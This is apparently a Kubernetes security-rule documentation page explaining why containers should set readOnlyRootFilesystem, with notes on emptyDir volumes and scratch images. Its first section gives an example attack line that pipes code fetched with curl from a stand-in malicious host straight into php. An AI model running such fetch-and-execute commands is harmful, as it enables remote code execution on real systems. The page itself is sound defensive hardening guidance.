+++
title = "containers[] .securityContext .readOnlyRootFilesystem == true"
weight = 2
+++

## An immutable root filesystem can prevent malicious binaries being added to PATH and increase attack cost

An immutable root filesystem prevents applications from writing to their local disk. This is desirable in the event of an intrusion as the attacker will not be able to tamper with the filesystem or write foreign executables to disk.

However if there are runtimes available in the container then this is not sufficient to prevent code execution. Consider `curl http://malicious.php | php` or `bash -c "echo 'much pasted code'"`.

## Notes

- Immutable filesystems will prevent your application writing to disk. There may be a requirement for temporary files or local caching, in which case an  `emptyDir` volume can be mounted with type `Memory`
- Any volume mounted into the container will have its own filesystem permissions
- Scratch containers are an ideal candidate for `immutableRootFilesystem` - they contain only your code, minimal `dev`, `etc`, `proc`, and `sys`, and so need a runtime (or injection into the scratch binary) to execute code. Without a writable filesystem the attack surface is dramatically reduced.


## External Links
- [Kubernetes Docs: Volumes](https://kubernetes.io/docs/concepts/storage/volumes/#emptydir)


{{% katacoda %}}
